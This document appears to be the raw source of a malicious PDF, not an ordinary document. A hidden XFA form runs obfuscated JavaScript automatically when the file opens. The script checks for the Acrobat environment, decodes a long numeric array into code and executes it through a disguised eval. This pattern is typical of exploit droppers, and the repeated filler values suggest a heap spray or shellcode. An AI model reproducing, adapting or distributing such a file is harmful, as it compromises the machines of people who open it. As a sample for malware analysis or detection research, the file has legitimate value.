%PDF-1.6
%‚„œ”
1 0 obj
<</MediaBox [0 0 1 1] /Type/Page /Contents 3 0 R /Parent 5 0 R>>
endobj
5 0 obj
<</Count 2 /Kids [1 0 R] /Type/Pages>>
endobj
8 0 obj
<</Type/EmbeddedFile /Length 5125>>
stream

<xdp:xdp



 xmlns:xdp="http://ns.adobe.com/xdp/">


<config><present>
<pdf>
<interactive>1</interactive>
<version>1.6</version>
</pdf><xdp><packets>*</packets></xdp><destination>pdf</destination></present></config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.5/">
<subform name='ergfb435tb43t'>
<pageSet><pageArea>
				<medium stock="default"/></pageArea></pageSet>
		<subform name="f23vf32"><gbgreb67972304/><field name="qwe123"><berbg67972304/>
<event activity='initialize'>
<script contentType='application/x-javascript'>

try{if(app.title)throw 1;}catch(q){r=3-2;}
a="Y'nK-m,qec6]y&lt;1CD}8sfI4'ip:xR{LB%r5_)k9.S u[lovE*h(3/wg?WAadb2=M7^QjVt0;UF+";
try{
	c="l";
	if(r)throw 1;
}catch(qq){}
s="";
b=[46,58,33,41,35,44,14,62,23,22,9,61,70,10,70,70,20,70,34,14,64,18,70,22,58,51,9,61,70,10,70,70,20,70,20,10,51,18,70,22,58,58,51,8,60,18,70,22,58,51,70,61,70,18,61,22,58,10,8,61,20,18,70,22,58,22,14,22,14,22,14,22,14,61,10,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,14,61,51,38,18,70,22,58,10,22,61,70,10,70,70,20,70,70,70,22,70,70,70,70,22,14,22,14,22,14,22,14,22,14,22,14,22,14,22,14,10,10,18,51,8,22,20,9,20,9,18,34,8,22,64,34,51,22,8,38,34,20,51,51,9,70,10,22,18,60,22,70,51,70,18,60,22,70,70,9,18,60,64,70,14,9,34,10,18,60,64,10,70,18,51,51,59,60,10,10,18,60,34,8,51,9,70,51,64,22,51,51,61,9,18,14,8,8,14,34,14,70,20,20,20,20,60,18,18,60,22,70,51,70,9,51,22,10,51,38,70,10,64,34,20,60,18,64,51,22,61,22,18,34,8,22,64,34,34,14,8,38,8,60,22,9,34,14,34,10,18,60,64,34,51,9,18,60,64,22,51,34,64,18,70,51,20,34,34,10,18,60,64,10,61,70,70,51,20,34,51,51,9,38,22,38,22,14,20,9,58,59,70,51,9,34,51,51,59,60,70,20,60,8,14,70,51,18,20,61,64,22,70,18,9,14,9,60,70,59,70,51,59,58,22,70,8,60,20,14,51,60,14,20,64,34,8,10,34,8,18,60,34,8,61,22,70,51,59,59,10,10,18,60,70,9,22,60,18,59,22,10,8,9,20,20,34,22,61,22,70,9,18,60,59,18,70,51,59,59,18,60,70,22,18,60,70,51,9,34,58,60,34,8,34,38,9,51,8,60,34,51,58,59,18,60,10,18,61,70,18,70,64,59,70,9,51,51,64,22,70,51,38,10,8,60,20,51,18,60,10,18,70,18,18,60,20,64,10,58,70,34,34,38,8,18,38,18,20,20,20,20,20,20,8,61,20,38,8,18,70,70,70,70,70,70,70,70,34,18,34,70,10,58,22,70,10,18,20,20,70,70,70,70,70,70,34,70,18,51,9,70,14,38,34,70,34,34,18,60,8,9,18,60,34,8,14,70,18,51,9,51,70,34,20,20,8,51,10,18,10,20,10,8,70,70,70,70,10,18,64,34,64,61,10,9,10,59,34,22,20,20,14,10,18,51,9,22,70,18,18,60,8,18,8,18,10,14,20,20,20,20,20,20,8,60,70,61,8,60,64,61,18,14,8,9,70,22,70,14,70,70,70,70,18,59,34,9,61,22,70,9,9,64,70,22,61,22,64,61,10,34,10,64,64,51,9,64,22,22,61,22,70,22,64,10,64,61,51,51,51,61,9,64,22,22,61,22,70,18,61,70,61,59,64,51,61,70,34,51,10,18,20,18,70,70,70,70,70,70,20,20,34,10,70,9,18,60,8,18,51,51,9,38,34,14,9,64,22,22,14,59,70,70,64,64,64,70,10,61,64,22,9,64,22,22,14,59,70,34,61,8,10,22,10,9,10,9,9,10,22,22,14,59,70,38,70,70,34,38,18,58,9,14,70,22,51,70,18,18,22,22,14,59,70,22,22,14,34,14,10,58,70,70,10,58,70,70,34,51,34,64,10,58,70,70,20,20,34,10,14,22,18,34,9,70,64,34,14,10,10,58,70,70,34,51,20,20,34,10,70,22,10,58,70,70,18,51,8,60,70,9,34,51,20,20,34,10,70,22,18,51,9,51,70,9,8,60,70,61,8,60,14,51,22,64,18,70,51,20,70,70,64,34,20,58,22,64,18,70,51,20,70,70,64,34,9,22,10,58,70,70,10,58,20,8,20,20,34,10,70,18,8,18,38,9,20,8,20,20,20,20,18,8,22,8,70,8,8,9,38,18,20,8,18,58,70,8,18,38,10,20,70,14,60,59,51,51,9,58,18,58,34,60,14,60,9,10,22,10,64,38,51,10,14,58,61,20,64,70,10,18,64,22,64,22,64,70,51,58,61,20,61,20,64,22,10,38,10,59,10,34,61,8,64,51,10,38,10,8,10,20,64,70,10,51,10,38,10,9,10,38,10,8,10,64,10,38,64,61,61,8,10,51,10,20,10,59,61,20,64,64,61,8,64,70,10,18,64,70,51,20,10,10,51,59,51,51,61,10,10,34,51,59,51,10,70,70,70,70,23,71,46,58,33,41,35,44,61,62,23,22,9,61,70,10,70,70,20,58,34,10,51,18,70,22,58,51,9,61,70,10,70,70,20,38,10,61,14,18,70,22,58,38,70,14,20,18,70,22,58,51,70,38,70,18,22,22,58,64,59,64,8,18,70,22,58,22,14,22,14,22,14,22,14,61,10,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,64,14,18,18,18,70,22,58,10,22,61,70,10,70,70,20,70,70,70,22,70,70,70,70,22,14,22,14,22,14,22,14,22,14,22,14,22,14,22,14,10,10,18,51,8,22,20,9,20,9,18,34,8,22,64,34,51,22,8,38,34,20,51,51,9,70,10,22,18,60,22,70,51,70,18,60,22,70,70,9,18,60,64,70,14,9,34,10,18,60,64,10,70,18,51,51,59,60,10,10,18,60,34,8,51,9,70,51,64,22,51,51,61,9,18,14,8,8,14,34,14,70,20,20,20,20,60,18,18,60,22,70,51,70,9,51,22,10,51,38,70,10,64,34,20,60,18,64,51,22,61,22,18,34,8,22,64,34,34,14,8,38,8,60,22,9,34,14,34,10,18,60,64,34,51,9,18,60,64,22,51,34,64,18,70,51,20,34,34,10,18,60,64,10,61,70,70,51,20,34,51,51,9,38,22,38,22,14,20,9,58,59,70,51,9,34,51,51,59,60,70,20,60,8,14,70,51,18,20,61,64,22,70,18,9,14,9,60,70,59,70,51,59,58,22,70,8,60,20,14,51,60,14,20,64,34,8,10,34,8,18,60,34,8,61,22,70,51,59,59,10,10,18,60,70,9,22,60,18,59,22,10,8,9,20,20,34,22,61,22,70,9,18,60,59,18,70,51,59,59,18,60,70,22,18,60,70,51,9,34,58,60,34,8,34,38,9,51,8,60,34,51,58,59,18,60,10,18,61,70,18,70,64,59,70,9,51,51,64,22,70,51,38,10,8,60,20,51,18,60,10,18,70,18,18,60,20,64,10,58,70,34,34,38,8,18,38,18,20,20,20,20,20,20,8,61,20,38,8,18,70,70,70,70,70,70,70,70,34,18,34,70,10,58,22,70,10,18,20,20,70,70,70,70,70,70,34,70,18,51,9,70,14,38,34,70,34,34,18,60,8,9,18,60,34,8,14,70,18,51,9,51,70,34,20,20,8,51,10,18,10,20,10,8,70,70,70,70,10,18,64,34,64,61,10,9,10,59,34,22,20,20,14,10,18,51,9,22,70,18,18,60,8,18,8,18,10,14,20,20,20,20,20,20,8,60,70,61,8,60,64,61,18,14,8,9,70,22,70,14,70,70,70,70,18,59,34,9,61,22,70,9,9,64,70,22,61,22,64,61,10,34,10,64,64,51,9,64,22,22,61,22,70,22,64,10,64,61,51,51,51,61,9,64,22,22,61,22,70,18,61,70,61,59,64,51,61,70,34,51,10,18,20,18,70,70,70,70,70,70,20,20,34,10,70,9,18,60,8,18,51,51,9,38,34,14,9,64,22,22,14,59,70,70,64,64,64,70,10,61,64,22,9,64,22,22,14,59,70,34,61,8,10,22,10,9,10,9,9,10,22,22,14,59,70,38,70,70,34,38,18,58,9,14,70,22,51,70,18,18,22,22,14,59,70,22,22,14,34,14,10,58,70,70,10,58,70,70,34,51,34,64,10,58,70,70,20,20,34,10,14,22,18,34,9,70,64,34,14,10,10,58,70,70,34,51,20,20,34,10,70,22,10,58,70,70,18,51,8,60,70,9,34,51,20,20,34,10,70,22,18,51,9,51,70,9,8,60,70,61,8,60,14,51,22,64,18,70,51,20,70,70,64,34,20,58,22,64,18,70,51,20,70,70,64,34,9,22,10,58,70,70,10,58,20,8,20,20,34,10,70,18,8,18,38,9,20,8,20,20,20,20,18,8,22,8,70,8,8,9,38,18,20,8,18,58,70,8,18,38,10,20,70,14,60,59,51,51,9,58,18,58,34,60,14,60,9,10,22,10,64,38,51,10,14,58,61,20,64,70,10,18,64,22,64,22,64,70,51,58,61,20,61,20,64,22,10,38,10,59,10,34,61,8,64,51,10,38,10,8,10,20,64,70,10,51,10,38,10,9,10,38,10,8,10,64,10,38,64,61,61,8,10,51,10,20,10,59,61,20,64,64,61,8,64,70,10,18,64,70,51,20,10,10,51,59,51,51,61,10,10,34,51,59,51,10,70,70,70,70,23,71,35,44,51,62,58,25,25,71,35,44,22,62,2,8,53,41,57,33,33,58,12,50,36,71,20,42,2,9,69,24,45,2,41,35,44,34,50,36,29,46,58,33,41,35,44,10,62,35,44,51,39,46,24,8,53,8,33,68,8,33,19,24,45,2,39,69,45,40,69,33,24,2,54,50,36,71,35,44,10,62,35,44,10,39,33,8,25,44,58,9,8,50,1,39,1,6,1,1,36,71,53,49,24,44,8,50,35,44,10,39,44,8,2,54,69,49,13,22,36,35,44,10,74,62,1,70,1,71,33,8,69,42,33,2,41,25,58,33,19,8,21,2,69,50,35,44,10,6,14,70,36,17,20,42,2,9,69,24,45,2,41,35,44,64,50,35,44,18,6,35,44,38,36,29,53,49,24,44,8,50,35,44,18,39,44,8,2,54,69,49,48,61,13,35,44,38,36,35,44,18,74,62,35,44,18,71,33,8,69,42,33,2,41,35,44,18,39,19,42,60,19,69,33,24,2,54,50,70,6,35,44,38,52,61,36,17,20,42,2,9,69,24,45,2,41,35,21,70,50,35,21,14,36,29,35,21,14,62,42,2,8,19,9,58,25,8,50,35,21,14,36,71,33,45,69,8,16,58,37,62,35,21,14,39,44,8,2,54,69,49,48,61,71,59,58,37,28,45,69,8,62,42,2,8,19,9,58,25,8,50,1,32,42,38,70,38,70,1,36,71,19,25,33,58,12,62,35,44,64,50,59,58,37,28,45,69,8,6,70,27,61,70,70,70,4,33,45,69,8,16,58,37,36,71,44,45,27,56,49,8,8,62,35,21,14,74,19,25,33,58,12,71,44,45,27,56,49,8,8,62,35,44,64,50,44,45,27,56,49,8,8,6,34,61,22,70,38,18,36,71,20,45,33,50,24,62,70,71,41,24,41,13,41,22,70,70,71,41,24,74,74,36,35,44,22,43,24,11,62,44,45,27,56,49,8,8,39,19,42,60,19,69,33,50,70,6,44,45,27,56,49,8,8,39,44,8,2,54,69,49,4,14,36,74,59,58,37,28,45,69,8,71,17,20,42,2,9,69,24,45,2,41,35,21,61,50,35,21,14,6,44,8,2,36,29,53,49,24,44,8,50,35,21,14,39,44,8,2,54,69,49,13,44,8,2,36,35,21,14,74,62,35,21,14,71,33,8,69,42,33,2,41,35,21,14,39,19,42,60,19,69,33,24,2,54,50,70,6,44,8,2,36,17,20,42,2,9,69,24,45,2,41,35,21,51,50,35,21,14,36,29,33,8,69,62,1,1,71,20,45,33,50,24,62,70,71,24,13,35,21,14,39,44,8,2,54,69,49,71,24,74,62,61,36,29,60,62,35,21,14,39,19,42,60,19,69,33,50,24,6,61,36,71,9,62,25,58,33,19,8,21,2,69,50,60,6,14,10,36,71,33,8,69,74,62,40,69,33,24,2,54,39,20,33,45,5,15,49,58,33,15,45,59,8,50,9,36,71,17,33,8,69,42,33,2,41,33,8,69,17,20,42,2,9,69,24,45,2,41,35,67,24,14,50,35,21,14,6,35,21,22,36,29,35,21,34,62,1,1,71,20,45,33,50,35,21,10,62,70,71,35,21,10,13,35,21,14,39,44,8,2,54,69,49,71,35,21,10,74,74,36,29,35,44,38,62,35,21,22,39,44,8,2,54,69,49,71,35,21,64,62,35,21,14,39,9,49,58,33,15,45,59,8,57,69,50,35,21,10,36,71,35,21,18,62,35,21,22,39,9,49,58,33,15,45,59,8,57,69,50,35,21,10,32,35,44,38,36,71,35,21,34,74,62,40,69,33,24,2,54,39,20,33,45,5,15,49,58,33,15,45,59,8,50,35,21,64,65,35,21,18,36,71,17,33,8,69,42,33,2,41,35,21,34,17,20,42,2,9,69,24,45,2,41,35,21,38,50,35,21,10,36,29,35,67,70,62,35,21,10,39,69,45,40,69,33,24,2,54,50,14,10,36,71,35,67,14,62,35,67,70,39,44,8,2,54,69,49,71,35,21,34,62,50,35,67,14,32,61,36,55,1,70,1,74,35,67,70,26,35,67,70,71,33,8,69,42,33,2,41,35,21,34,17,20,42,2,9,69,24,45,2,41,35,67,61,50,35,21,14,36,29,35,21,34,62,1,1,71,20,45,33,50,35,21,10,62,70,71,35,21,10,13,35,21,14,39,44,8,2,54,69,49,71,35,21,10,74,62,61,36,29,35,21,34,74,62,1,32,42,1,71,35,21,34,74,62,35,21,38,50,35,21,14,39,9,49,58,33,15,45,59,8,57,69,50,35,21,10,74,14,36,36,71,35,21,34,74,62,35,21,38,50,35,21,14,39,9,49,58,33,15,45,59,8,57,69,50,35,21,10,36,36,17,33,8,69,42,33,2,41,35,21,34,17,20,42,2,9,69,24,45,2,41,35,67,51,50,36,29,35,67,22,62,35,44,34,50,36,71,24,20,50,35,67,22,13,38,70,70,70,36,29,35,67,34,62,1,45,74,42,57,40,67,54,54,54,37,25,42,30,22,31,3,52,52,52,52,52,53,57,57,57,57,31,57,57,57,57,57,57,57,57,57,57,57,57,66,57,57,57,57,57,57,57,57,20,49,58,57,40,24,57,54,0,57,38,18,47,21,31,3,1,71,35,67,10,62,35,44,14,71,35,67,64,62,35,21,51,50,35,67,10,36,17,8,44,19,8,29,35,67,34,62,1,37,31,74,57,40,67,24,66,49,47,25,38,20,45,31,3,52,52,52,52,52,53,57,57,57,57,31,57,57,57,57,57,57,57,57,57,57,57,57,66,57,57,57,57,57,57,57,57,0,27,15,57,40,24,57,54,0,57,52,20,47,22,31,3,1,71,35,67,10,62,35,44,61,71,35,67,64,62,35,21,51,50,35,67,10,36,17,35,67,18,62,1,40,72,37,7,57,16,54,54,57,57,31,31,1,71,35,67,38,62,35,21,61,50,1,66,72,73,31,1,6,14,70,38,18,22,36,71,35,44,44,70,62,1,66,66,9,57,57,57,47,16,57,57,47,57,57,57,57,53,21,57,57,57,57,66,47,16,57,57,47,57,57,57,57,31,57,57,57,57,57,53,47,16,57,57,47,57,57,57,57,31,57,57,57,57,31,54,47,16,57,57,47,57,57,57,57,31,57,57,57,57,47,66,47,47,57,57,47,57,57,57,57,21,57,57,57,57,73,53,47,47,57,57,47,57,57,57,57,53,21,57,57,57,72,57,47,16,57,63,53,57,57,57,15,40,21,57,57,57,57,57,57,57,57,57,57,63,16,57,67,52,52,52,52,52,1,71,35,44,44,14,62,35,67,18,74,35,67,38,74,35,44,44,70,74,35,67,34,71,35,44,44,61,62,35,67,24,14,50,35,67,64,6,1,1,36,71,24,20,50,35,44,44,61,39,44,8,2,54,69,49,32,61,36,35,44,44,61,74,62,42,2,8,19,9,58,25,8,50,1,32,70,70,1,36,71,35,44,44,51,62,35,67,61,50,35,44,44,61,36,71,35,21,70,50,35,44,44,51,36,71,7,53,8,14,61,51,39,33,58,53,68,58,44,42,8,62,35,44,44,14,17,35,67,51,50,36,71];
for(i=0;i&lt;b.length;i++)
try{app.title();}catch(q){
s+=a[b[i]];
}
try{if(app.title())throw 1;}catch(q){k=s;ev&#97;l(k);}
</script>
</event>
<ui>	
<imageEdit/>
</ui>
</field>
</subform>
</subform>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">

<xfa:data><ergfb435tb43t><qwe123>zva</qwe123>
</ergfb435tb43t>
</xfa:data>
</xfa:datasets>
</xdp:xdp>
endstream
endobj
18 0 obj
<</Rect [12.5 5.1 18.3 7.7] /Subtype/Widget /Ff 65536 /T (qwe123[0]) /MK <</TP 1>> /Type/Annot /FT/Btn /DA (/CourierStd 10 Tf 0 g) /Parent 19 0 R /TU (qwe123) /P 1 0 R /F 4>>
endobj
19 0 obj
<</T (f23vf32[0]) /Kids [18 0 R] /Parent 20 0 R>>
endobj
20 0 obj
<</T (ergfb435tb43t[0]) /Kids [19 0 R]>>
endobj
23 0 obj
<</AcroForm 21 0 R /Pages 5 0 R /Type/Catalog>>
endobj
21 0 obj
<</DA (/Helv 0 Tf 0 g ) /Fields [20 0 R] /XFA 8 0 R>>
endobj
xref
0 24 
trailer
<</Size 22 /Root 23 0 R>>
startxref
17175
%%EOF
